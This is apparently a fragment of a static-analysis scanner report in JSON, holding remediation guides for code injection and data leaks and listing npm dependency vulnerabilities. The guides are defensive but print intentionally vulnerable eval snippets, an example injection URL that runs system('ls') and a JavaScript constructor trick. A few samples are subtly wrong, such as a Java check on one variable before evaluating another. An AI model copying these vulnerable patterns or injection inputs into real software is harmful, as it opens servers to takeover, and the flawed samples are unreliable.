risk.\n// An attacker can provide a malicious PHP code as a value for the \"script\" parameter and execute it.\neval($script);\n\necho \"Script executed successfully!\";\n?>\n```\n\nBy visiting a URL like `http://example.com/vulnerable.php?script=system('ls');` an attacker could execute the `ls` command, and with more malicious intent, they can cause significant harm.\n\n## Mitigation\n\nTo secure your code, ensure that strings passed to evaluation or execution functions are from trusted sources, or are validated against an allow-list:\n\n```php\n<?php\n$allowedScripts = ['print_hello' => 'echo \"Hello, World!\";'];\n\n$scriptKey = $_GET['scriptKey'];\n\n// Validate against an allow-list of scripts.\nif (!array_key_exists($scriptKey, $allowedScripts)) {\n    die(\"Not permitted\");\n}\n\neval($allowedScripts[$scriptKey]);\n\necho \"Script executed successfully!\";\n?>\n```\n\n## Further Considerations\n\nDynamic code evaluation in PHP should be used with extreme caution. Whenever possible, avoid using functions like `eval()` altogether. If dynamic functionality is needed, consider more secure alternatives like creating pre-defined safe functions or adopting a Domain-Specific Language (DSL) with strict parsing and validation. Always use PHP's built-in functions to sanitize and validate all user inputs to prevent code injections.\n\n:::\n\n::::\n\n## CWEs\n\n**[CWE-77](https://cwe.mitre.org/data/definitions/77.html)**\n\n**[CWE-78](https://cwe.mitre.org/data/definitions/78.html)**\n\n**[CWE-94](https://cwe.mitre.org/data/definitions/94.html)**\n\n**[CWE-917](https://cwe.mitre.org/data/definitions/917.html)**\n\n**[OWASP-A1](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A1-Injection)**",
                                "text": "Attacker-controlled data is used in a code execution context without undergoing escaping or validation. This indicates a remote code execution vulnerability.\n\n# Remote Code Execution\n\nA **remote code execution** (RCE) vulnerability allows an attacker to execute arbitrary code on you server. On a\nweb-server, RCE vulnerabilities are typically cause when untrusted input from the HTTP request is evaluated as code.\n\n::::tabs\n\n:::tab[Java]\n\n## Remote Code Execution in Java\n\nDynamic evaluation of code in Java can be achieved in a number of ways. The Java scripting API (defined in the\n`javax.script` page) package allows you to evaluate code in a number of different scripting languages via the \n`ScriptEngineManager` class. There are, for instance, JVM compatible versions of Python (called Jython) and Ruby (called\nJRuby) that can be loaded as jars and invoked via the script manager.\n\nThe Java compiler can also be invoked programmatically via the `javax.tools.JavaCompiler` interface. This approach is\noften used by build tools, which convert files on disk to runnable code that can be loaded into the JVM.\n\nFinally, there are a number of other tools that allow dynamic evaluation of code. The Apache Bean Scripting Framework\na range of scripting languages, and the scripting languages like Groovy can be added to the Java runtime by simply\nadding a jar in the classpath.\n\nWith all of these approaches, it is of vital importance that you only pass trusted code to the scripting API. Passing \nuntrusted content to the `ScriptingEngine` class, for instance,  will allow an attacker to execute arbitrary code in \nyour Java Virtual Machine - meaning they can steal sensitive information, read files from disk, or install malware.\n\nTo secure your code, you should ensure any strings passed to a scripting engine are taken from a trusted source, or \nvalidated against an allow-list:\n\n```java\nprotected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException \n{\n  String code = request.getParameter(\"script\");\n\n  // Since we are taking the code to execute from an untrusted source (the HTTP\n  // request) we *must* validate against an allowed list of scripts.      \n  if (!allowedCommands.contains(code))\n    throw new IOException(\"Not permitted\");\n\n  ScriptEngineManager manager = new ScriptEngineManager();\n  ScriptEngine        engine  = manager.getEngineByName(\"JavaScript\");\n  engine.eval(input);\n  \n  response.setStatus(200);\n}\n```\n\n## Further Considerations\n\nDynamic code evaluation is often used where there is a need to develop a *Domain Specific Language* (DSL) for expert \nusers. In such a scenario, it is preferable to execute DSL statements in a sandbox with limited permissions. (For\ninstance, you probably want to limit disk and network access if you are simply evaluating mathematical statements.) One\nway to achieve this is by formally defining the grammar of the DSL, and using a tool like Java Compiler Compiler (JavaCC)\nor ANTLR to generate a parser that can evaluate scripts at runtime. Since the grammar specification defines which\nfunctions are executable, you have full control over what the DSL can do.\n\n:::\n\n:::tab[C#]\n\n## Remote Code Execution in C#\n\nC# code can be evaluated dynamically using the Code Document Object Model (CodeDOM) module, defined in the \n`System.CodeDom` namespace. CodeDOM allows for templated code generation and dynamic compilation within the .NET \nruntime.\n\nPassing untrusted string as code to be evaluated allows an attacker to execute arbitrary code in your C# runtime -\nmeaning they can steal sensitive information, read files from disk, or install malware. This is very \ndangerous!\n\nTo mitigate remote code execution attacks, you must ensure any strings are taken from a trusted source, or validated \nagainst an allow-list. To be totally secure, it's often better to using the CodeDOM module in applications that face\nthe internet.\n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in .NET, consider using one of\nthe following solutions:\n\n* Microsoft's DSL Tools, that come bundled with Visual Studio and allow the visual creation of DSLs.\n* A scripting language like Lua that can be dynamically loaded and executed within the .NET runtime.\n* ANTLR, a parser generator that can be used to generate and execute sand-boxed languages.\n\n:::\n\n:::tab[JavaScript]\n\n## Remote Code Execution in JavaScript Using Eval\n\nJavaScript makes dynamic evaluation of strings as code very easy by making the `eval(...)` function available. For\ninstance, the following JavaScript code will print \"WARNING\" to the console:\n\n```javascript\n  eval(\"console.log('WARNING')\")\n```\n\nIf an attacker is able to control the input to an `eval(...)` call by passing it in an HTTP request, they can run code\non your server. This will allow them to scan your file system, install a remote shell, and take over your server \ncompletely.\n\n## Other Types of Remote Code Execution in JavaScript\n\nInput strings can also be dynamically evaluated as code in the JavaScript runtime using the `Function(...)` or\n`Script(...)` constructors. There are various subtle ways of doing this, as illustrated by the following code:\n\n```javascript\nconst arbitraryObject = {},\n      a = 'constructor',\n      b = 'constructor',\n      s = 'console.log(\"Hacked!\")';\n\n// This will print the phrase 'Hacked!' to the console.\narbitraryObject[a][b](s)()\n```\n\nThese two lines of code illustrate an RCE vulnerability. Properties can be looked up on a JavaScript object by name, \nand this includes functions. The illustrated exploit gets the constructor function for an arbitrary object, looks up \nrhe constructor function for the constructor (which is actually `Function(...)`), passes it a command string, then \nexecutes that string. \n\nAlthough this example is contrived, it illustrates how any code that has the form:\n\n```javascript\narbitraryObject[parameterA][parameterB](parameterC)()\n```\n\n...enables a remote execution attack if all the parameters can be controlled by an attacker.\n\n## Mitigation\n\n* Don't use the `eval(...)` function in your code. Check your codebase with a linter as part of your build process.\n* Consider disabling use of `eval(...)` in the Node.js runtime by passing the `--disallow-code-generation-from-strings`\n  at startup. (You will have to ensure none of your dependencies use the `eval(...)` function to do this.)\n* Validate all untrusted input with allow-lists: check any input take from the HTTP request is safe before processing \n  it.\n* If you make nested lookups on objects, make assertions about object types when pulling them from another object. If\n  your code finds a function where it expects a string, don't invoke it!\n\n:::\n\n:::tab[Python]\n\n## Remote Code Execution in Python\n\nPython code can be evaluated dynamically using the global `eval(...)` and `exec(...)` functions. The former expects\na string representing a (single) valid Python expression, while the later can execute multiple expressions - making it \nable to create new module, class, and function definitions. Both functions have access to the global and local state\nat the point of invocation.\n\nPassing untrusted string as code to be evaluated allows an attacker to execute arbitrary code in your Python runtime -\nmeaning they can steal sensitive information, read files from disk, or install malware. This is very \ndangerous!\n\nTo mitigate remote code execution attacks, you must ensure any strings are taken from a trusted source, or validated \nagainst an allow-list. To be totally secure, it's often better to avoid `eval(...)` and `exec(...)` functions of Python \naltogether. \n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in Python, consider using the \n`ast` (*Abstract Syntax Tree*) module, which allows you to parse expressions and evaluate each node atomically. This will\nhelp you \"sandbox\" the functions a user can invoke, removing the risks of arbitrary code execution.\n\nHere's a simple example of a DSL that can evaluate mathematical expressions:\n\n```python\nimport ast, operator, math\n\ndef safe_eval(expression):\n  \"\"\"Evaluate a simple mathematical function by parsing an expression into an\n  abstract syntax tree and safely evaluating each node in turn.\"\"\"\n\n  def find_math_function(x, *args):\n    if x not in [x for x in dir(math) if not \"__\" in x]:\n      raise SyntaxError(f\"Unknown function {x}()\")\n\n    return getattr(math, x)\n\n  binary_operations = {\n    ast.Add:   operator.add,\n    ast.Sub:   operator.sub,\n    ast.Mult:  operator.mul,\n    ast.Div:   operator.truediv,\n    ast.Mod:   operator.mod,\n    ast.Pow:   operator.pow,\n    ast.Call:  find_math_function,\n    ast.BinOp: ast.BinOp,\n  }\n\n  unary_operations = {\n    ast.USub:    operator.neg,\n    ast.UAdd:    operator.pos,\n    ast.UnaryOp: ast.UnaryOp,\n  }\n\n  operations = tuple(binary_operations) + tuple(unary_operations)\n\n  syntax_tree = ast.parse(expression, mode='eval')\n\n  def _eval(node):\n    if isinstance(node, ast.Expression):\n      return _eval(node.body)\n    elif isinstance(node, ast.Str):\n      return node.s\n    elif isinstance(node, ast.Num):\n      return node.value\n    elif isinstance(node, ast.Constant):\n      return node.value\n    elif isinstance(node, ast.BinOp):\n      if isinstance(node.left, operations):\n        left = _eval(node.left)\n      else:\n        left = node.left.value\n      if isinstance(node.right, operations):\n        right = _eval(node.right)\n      else:\n        right = node.right.value\n      return binary_operations[type(node.op)](left, right)\n    elif isinstance(node, ast.UnaryOp):\n      if isinstance(node.operand, operations):\n        operand = _eval(node.operand)\n      else:\n        operand = node.operand.value\n      return unary_operations[type(node.op)](operand)\n    elif isinstance(node, ast.Call):\n      args = [_eval(x) for x in node.args]\n      function = find_math_function(node.func.id)\n      return function(*args)\n    else:\n      raise SyntaxError(f\"Bad syntax, {type(node)}\")\n\n  return _eval(syntax_tree)\n\nsafe_eval(\"1 + 1\")       # Will return 2\nsafe_eval(\"(100*10)+6\")  # Will return 1006\nsafe_eval(\"sqrt(16)+1\")  # Will return 5.0\n```\n\n:::\n\n:::tab[Scala]\n\n## Remote Code Execution in Scala\n\nScala code can be evaluated dynamically using the `scala-lang` package, that will generate bytecode objects to be loaded \ninto the underlying Java Virtual Machine. The following web-application takes a scriptlet from an HTTP parameter and\nevaluates the result:\n\n```scala\ncase class Scriptlet(code: String)\n\ndef scriptExecutionForm = Form(\n  mapping(\n    \"code\" -> text\n  )(Scriptlet.apply)(Scriptlet.unapply)\n)\n\ndef evaluateScript = Action(parse.form(scriptExecutionForm)) { request =>\n  val settings = new Settings\n\n  settings.usejavacp.value   = true\n  settings.deprecation.value = true\n\n  val eval      = new IMain(settings)\n  val evaluated = eval.interpret(request.body.code)\n\n  if (evaluated == Success) {\n    val result = eval.valueOfTerm(\"result\").get.asInstanceOf[String]\n    Ok(result)\n  }\n  else {\n    Status(488)(\"Unable to evaluate this code\")\n  }\n}\n```\n\nAnother common method of achieving dynamic execution in Scala is by using reflection:\n\n```scala\nimport scala.reflect.runtime.universe\nimport scala.tools.reflect.ToolBox\n\nval toolbox = universe.runtimeMirror(getClass.getClassLoader).mkToolBox()\ntoolbox.eval(toolbox.parse(\"\"\"println(\"Hello world\")\"\"\"))\n```\n\nPassing untrusted string as code to be evaluated allows an attacker to execute arbitrary code in your Java Virtual \nMachine - meaning they can steal sensitive information, read files from disk, or install malware. This is very \ndangerous!\n\nTo mitigate remote code execution attacks, you must ensure any strings are taken from a trusted source, or validated \nagainst an allow-list. To be totally secure, it's often better to avoid using dynamic evaluation of Scala altogether. \n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in Scala, consider using a\ntoolkit like the Scala Standard Parser Combinator Library, which allows you to write parsers that will \"sandbox\" the \nfunctions a user can invoke, removing the risks of arbitrary code execution.\n\nThe `math-expression-parser` library is good example of a well-scoped DSL that allows evaluation of simple arithmetic\nexpressions:\n\n```scala\nimport io.github.facaiy.math.expression.MathExp\n\nval expressionString = \"1.0 + sqrt(2 * $a1) + $a2 ** 2\"\nval parsedExpression = MathExp.parse(expressionString)\nval inputVariables   = Map(\"a1\" -> 2, \"a2\" -> 1)\n\n// This will return the value \"4.0\", by evaluating the expression with the supplied input variables.\nval output = parsedExpression.eval(inputVariables)\n```\n\n:::\n\n:::tab[Go]\n\n## Remote Code Execution in Go\n\nDynamic execution of Go is relatively rare. The Go playground (https://go.dev/play/) allows you to run Go code from a\nweb browser, and achieves this by dynamically compiling code using the Go toolchain, and executing the compiled code in\na sandbox on a remote server.\n\nMore common is the use of packages like `net/rpc` or `grpc` to allow remote invocation of individual methods across a \nnetwork. This allows a development team to build efficient, distributed micro-services.\n\nTo mitigate remote code execution attacks in a distributed computing environment, you must ensure any procedure calls \ncome from a trusted source. With `grpc` this can be achieved using Application Layer Transport Security (ALTS), a mutual \nauthentication and transport developed by Google:\n\n```go\nimport (\n  \"google.golang.org/grpc\"\n  \"google.golang.org/grpc/credentials/alts\"\n)\n\naltsTC          := alts.NewClientCreds(alts.DefaultClientOptions())\nconnection, err := grpc.Dial(serverAddr, grpc.WithTransportCredentials(altsTC))\n```\n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in Go, consider using an \nembeddable scripting language like Lua:\n\n```go\nimport (\n  \"github.com/yuin/gopher-lua\"\n)\n\nfunc main() {\n  // Instantiate a Lua sandbox.\n  sandbox := lua.NewState()\n  \n  defer sandbox.Close()\n  \n  // Dynamically execute a string as Lua code.\n  if err := sandbox.DoString(`print(\"hello\")`); err != nil {\n    panic(err)\n  }\n}\n```\n\nThis example will execute the simple Lua expression `print(\"hello\")`. Using a Lua sandbox in this fashion will allow you \nto execute dynamic expressions passed by a user safely - simply pass the expression to the `sandbox.DoString(...)` \nfunction to execute it. The executed code will *only* be able to access state you pass to the sandbox via the \n`sandbox.SetField(...)` function, closing any security loopholes associated with remote code execution.\n\n:::\n\n:::tab[PHP]\n\n## Remote Code Execution in PHP\n\nPHP provides several functions that allow for the execution of system commands and the evaluation of code dynamically. Some commonly used functions for this purpose include `eval()`, `system()`, `exec()`, `passthru()`, `shell_exec()`, and others.\n\nThis vulnerability arises when developers use these functions without properly validating or sanitizing user inputs. This can allow an attacker to inject and execute arbitrary code on the server.\n\nConsider the following PHP snippet, which takes a script input from an HTTP request and evaluates it:\n\n```php\n<?php\n$script = $_GET['script'];\n\n// Using the eval function directly on unsanitized input poses a severe security risk.\n// An attacker can provide a malicious PHP code as a value for the \"script\" parameter and execute it.\neval($script);\n\necho \"Script executed successfully!\";\n?>\n```\n\nBy visiting a URL like `http://example.com/vulnerable.php?script=system('ls');` an attacker could execute the `ls` command, and with more malicious intent, they can cause significant harm.\n\n## Mitigation\n\nTo secure your code, ensure that strings passed to evaluation or execution functions are from trusted sources, or are validated against an allow-list:\n\n```php\n<?php\n$allowedScripts = ['print_hello' => 'echo \"Hello, World!\";'];\n\n$scriptKey = $_GET['scriptKey'];\n\n// Validate against an allow-list of scripts.\nif (!array_key_exists($scriptKey, $allowedScripts)) {\n    die(\"Not permitted\");\n}\n\neval($allowedScripts[$scriptKey]);\n\necho \"Script executed successfully!\";\n?>\n```\n\n## Further Considerations\n\nDynamic code evaluation in PHP should be used with extreme caution. Whenever possible, avoid using functions like `eval()` altogether. If dynamic functionality is needed, consider more secure alternatives like creating pre-defined safe functions or adopting a Domain-Specific Language (DSL) with strict parsing and validation. Always use PHP's built-in functions to sanitize and validate all user inputs to prevent code injections.\n\n:::\n\n::::\n\n## CWEs\n\n**[CWE-77](https://cwe.mitre.org/data/definitions/77.html)**\n\n**[CWE-78](https://cwe.mitre.org/data/definitions/78.html)**\n\n**[CWE-94](https://cwe.mitre.org/data/definitions/94.html)**\n\n**[CWE-917](https://cwe.mitre.org/data/definitions/917.html)**\n\n**[OWASP-A1](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A1-Injection)**"
                            },
                            "helpUri": "https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A1-Injection",
                            "id": "code-injection-attacker-controlled/8180dc380d1880be8b4c9a1a73fb1529",
                            "name": "Remote Code Execution: Code Injection Through Attacker-Controlled Data Via Req In Views.js:<Lambda>0.<Lambda>3",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "9",
                                "tags": [
                                    "ng-sast",
                                    "CVSS 9",
                                    "CWE 77",
                                    "CWE 78",
                                    "CWE 917",
                                    "OWASP 2021 a03-injection",
                                    "OWASP a03-2021-injection",
                                    "OWASP a1-injection",
                                    "Remote Code Execution"
                                ]
                            },
                            "shortDescription": {
                                "text": "Remote Code Execution: Code Injection Through Attacker-controlled Data via req in views.js:<lambda>0.<lambda>3"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "warning",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "follow-redirects is vulnerable to Exposure of Private Personal Information to an Unauthorized Actor."
                            },
                            "help": {
                                "markdown": "follow-redirects is vulnerable to Exposure of Private Personal Information to an Unauthorized Actor",
                                "text": "follow-redirects is vulnerable to Exposure of Private Personal Information to an Unauthorized Actor"
                            },
                            "helpUri": "https://cwe.mitre.org/data/definitions/1035.html",
                            "id": "oss_vuln/ecb7a4d25a55e597a5e00f684de029d4",
                            "name": "Pkg:npm/Follow-Redirects@1.5.10",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "6.5",
                                "tags": [
                                    "ng-sast",
                                    "CVE-2022-0155",
                                    "CVSS 6.5",
                                    "CWE 1035",
                                    "CWE 359",
                                    "CWE 937",
                                    "No exploits",
                                    "Unreachable"
                                ]
                            },
                            "shortDescription": {
                                "text": "pkg:npm/follow-redirects@1.5.10"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "warning",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "passing untrusted user input - even after sanitizing it - to `SendStream.redirect()` may execute untrusted code."
                            },
                            "help": {
                                "markdown": "passing untrusted user input - even after sanitizing it - to `SendStream.redirect()` may execute untrusted code",
                                "text": "passing untrusted user input - even after sanitizing it - to `SendStream.redirect()` may execute untrusted code"
                            },
                            "helpUri": "https://cwe.mitre.org/data/definitions/79.html",
                            "id": "oss_vuln/c3c61880b3e5bcb556554a6fd5e0a78c",
                            "name": "Pkg:npm/Send@0.17.1",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "4.7",
                                "tags": [
                                    "ng-sast",
                                    "CVE-2024-43799",
                                    "CVSS 4.7",
                                    "CWE 1035",
                                    "CWE 79",
                                    "CWE 937",
                                    "No exploits",
                                    "Unreachable"
                                ]
                            },
                            "shortDescription": {
                                "text": "pkg:npm/send@0.17.1"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "error",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "The path-parse package is vulnerable to Regular Expression Denial of Service (ReDoS) via `splitDeviceRe`, `splitTailRe`, and `splitPathRe` regular expressions. ReDoS exhibits polynomial worst-case time complexity."
                            },
                            "help": {
                                "markdown": "The path-parse package is vulnerable to Regular Expression Denial of Service (ReDoS) via `splitDeviceRe`, `splitTailRe`, and `splitPathRe` regular expressions. ReDoS exhibits polynomial worst-case time complexity.",
                                "text": "The path-parse package is vulnerable to Regular Expression Denial of Service (ReDoS) via `splitDeviceRe`, `splitTailRe`, and `splitPathRe` regular expressions. ReDoS exhibits polynomial worst-case time complexity."
                            },
                            "helpUri": "https://cwe.mitre.org/data/definitions/1035.html",
                            "id": "oss_vuln/3407d7b810db3718c2fb2d9807889e2b",
                            "name": "Pkg:npm/Path-Parse@1.0.6",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "7.5",
                                "tags": [
                                    "ng-sast",
                                    "CVE-2021-23343",
                                    "CVSS 7.5",
                                    "CWE 1035",
                                    "CWE 937",
                                    "No exploits",
                                    "Unreachable"
                                ]
                            },
                            "shortDescription": {
                                "text": "pkg:npm/path-parse@1.0.6"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "warning",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "Sensitive database data is written to log in this flow."
                            },
                            "help": {
                                "markdown": "Sensitive database data is written to log in this flow.\n\n# Sensitive Data Leaks\n\nDisclosing system information helps an adversary learn about your web application and form a plan of attack. You should\ntry to reveal as little about your technology stack and architecture as possible, beyond what is essential for your\nusers to know. Revealing system information makes life easier for an attacker, and gives them a playbook of\nvulnerabilities they can probe for.\n\nHere are some common ways websites leak sensitive data:\n\n* Error conditions that display stack traces or database error messages to the user.\n* Open directory listings that allow exploration of the server's file system.\n* Unsanitized comments in HTML and template files the reveal system details.\n\n::::tabs\n\n:::tab[Java]\n\n## How to Prevent Data Leaks in Java\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment, by specifying an error page in your `web.xml` file:\n\n```xml\n<error-page>\n  <location>/error.html</location>\n</error-page>\n```\n  \nThis error page should only contain a generic error message (e.g. \"An error occurred\"). Stack traces should be written\nto server-side logs.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the\nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```java\ntry \n{\n    user = getDatabase().findUser(email);\n}\ncatch (SQLException ex) \n{\n    log.error(\"An error occurred looking up the user profiles\", ex):\n    throw new ClientFacingException(\"An unexpected error occurred, please try again later.\");\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Java to server static Javascript files\nfrom the `/js` directory:\n  \n```xml\n<servlet-mapping>\n    <servlet-name>default</servlet-name>\n    <url-pattern>/js/*.js</url-pattern>\n</servlet-mapping>\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in the Jetty web-server:\n  \n```java\nHttpConfiguration.setSendServerVersion(false);\n```\n\n:::\n\n:::tab[C#]\n\n## How to Prevent Data Leaks in C#\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. When you create a new ASP.NET application, the \ntemplate will generate a startup class with some configuration logic:\n\n```csharp\n    public void Configure(IApplicationBuilder app, IWebHostEnvironment env)\n    {\n        if (env.IsDevelopment())\n        {\n            app.UseDeveloperExceptionPage();\n        }\n        else\n        {\n            app.UseExceptionHandler(\"/Home/Error\");\n        }\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the ASP.NET web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation. You can configure the error page that is generated at\n`/Views/Shared/Errors.cs.html`.\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. An ASP.NET web application can be configured to serve static content under\nthe `wwwroot` directory by adding the following line in the startup configuration:\n\n```csharp\napp.UseStaticFiles();\n```\n\nYou can also add additional static content directories with the following logic:\n\n```csharp\napp.UseStaticFiles(new StaticFileOptions\n{\n    FileProvider = new PhysicalFileProvider(Path.Combine(env.ContentRootPath, \"MyStaticFiles\")),\n    RequestPath = \"/StaticFiles\"\n});\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In ASP.NET, you can programmatically remove it in the following manner:\n\n```csharp\nHttpContext.Current.Response.Headers.Remove(\"Server\");\n```\n\nIf you are deploying to IIS, you can remove the header in your configuration settings:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration>\n    <system.webServer>\n        <security>\n            <requestFiltering removeServerHeader=\"true\" />\n        </security>\n    </system.webServer>\n</configuration>\n```\n\n:::\n\n:::tab[JavaScript]\n\n## How to Prevent Data Leaks in JavaScript\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. This Express server will dump stack trace \ninformation only in the `development` environment, and disable it in `production`:\n  \n```javascript\nconst errorhandler = require('errorhandler')\nconst express      = require('express')\n\nconst app = express()\n\napp.use(errorhandler({\n  dumpExceptions : app.get('env') === 'development',\n  showStack      : app.get('env') === 'development'\n}))\n```\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database are logged, but not shown to the user. Here a generic error \nmessage is shown to the user, while the detailed error is written to the logs for investigation:\n\n```javascript\napp.get('/profile', (request, response) => {\n  db.run('SELECT * FROM USERS WHERE email = ?', [ request.session.user ], (error, user) => {\n    if (error) {\n      log.error(error)\n      response.send('An unexpected error occurred')\n      return\n    }\n\n    response.send(`<p>Your email is ${user.email}</p>`)\n  })\n})\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Expression to server static content (like \nclient-side JavaScript and CSS files) from the `/static` directory:\n  \n```javascript\napp.use(express.static(__dirname + '/static'))\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in Express:\n  \n```javascript\n// Disable the 'X-Powered-By' header.\napp.disable('x-powered-by')\n\nconst cookieParser = require('cookie-parser')\nconst session      = require('express-session')\n\napp.use(cookieParser('secret'))\napp.use(session({\n  cookie : {\n    maxAge   : 60000,\n    httpOnly : true,\n    sameSite : 'strict',\n    secure   : app.get('env') !== 'development'\n  },\n\n  // Make the session cookie name generic.\n  name   : 'session',\n  secret : process.env.SESSION_SECRET || uid.sync(18)\n}))\n```\n\n:::\n\n:::tab[Python]\n\n## How to Prevent Data Leaks in Python\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Observe how the Flask framework uses different error\npages in development and production modes, distinguished by whether the environment variable `FLASK_ENV` is set to\n`development`:\n\n```python\n  @property\n  def debug(self) -> bool:\n     \"\"\"Whether debug mode is enabled. When using ``flask run`` to start\n     the development server, an interactive debugger will be shown for\n     unhandled exceptions, and the server will be reloaded when code\n     changes. This maps to the :data:`DEBUG` config key. This is\n     enabled when :attr:`env` is ``'development'`` and is overridden\n     by the ``FLASK_DEBUG`` environment variable. It may not behave as\n     expected if set in code.\n\n     **Do not enable debug mode when deploying in production.**\"\"\"\n     return self.config[\"DEBUG\"]\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces, and even allow interactive execution of Python code.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the Flask web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation:\n\n```python\n  def log_exception(self, exc_info) -> None:\n    \"\"\"Logs an exception.  This is called by :meth:`handle_exception`\n    if debugging is disabled and right before the handler is called.\n    The default implementation logs the exception as error on the\n    :attr:`logger`.\n    \"\"\"\n    self.logger.error(\n        f\"Exception on {request.path} [{request.method}]\", exc_info=exc_info\n    )\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Flask web-server:\n\n```python\nfrom flask import Flask\n\napp = Flask(__name__, static_folder='static')\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In the Gunicorn WSGI container, you can configure this header in your `gunicorn.conf.py` config \nfile:\n\n```python\nimport gunicorn\n\n# Make the server name completely generic.\ngunicorn.SERVER_SOFTWARE = 'Server'\n```\n\n:::\n\n:::tab[Scala]\n\n## How to Prevent Data Leaks in Scala\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Notice how the Play framework uses different error\npages in development and production modes:\n\n```scala\n  /**\n   * Invoked in dev mode when a server error occurs.\n   */\n  protected def onDevServerError(request: RequestHeader, exception: UsefulException): Future[Result] = {\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.devError(playEditor, exception))\n    }\n  }\n\n  /**\n   * Invoked in prod mode when a server error occurs.\n   */\n  protected def onProdServerError(request: RequestHeader, exception: UsefulException): Future[Result] =\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.error(exception))\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```scala\n  override def onServerError(request: RequestHeader, exception: Throwable): Future[Result] = {\n    try {\n      val usefulException = HttpErrorHandlerExceptions.throwableToUsefulException(sourceMapper, !config.showDevErrors, exception)\n\n      // Write the full error context and stack trace to the log file.\n      logServerError(request, usefulException)\n\n      // Sanitize the error to be displayed to the user, when in production-mode.\n      if (config.showDevErrors) onDevServerError(request, usefulException)\n      else onProdServerError(request, usefulException)\n    } catch {\n      case NonFatal(e) =>\n        logger.error(\"Error while handling error\", e)\n        Future.successful(InternalServerError(fatalErrorMessage(request, e)))\n    }\n  }\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. In the Play framework, static assets like JavaScript and CSS files are \ntypically kept in a separate `/public` and mapped in the routes file as follows:\n\n```scala\nGET  /assets/*file        controllers.Assets.at(path=\"/public\", file)\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session 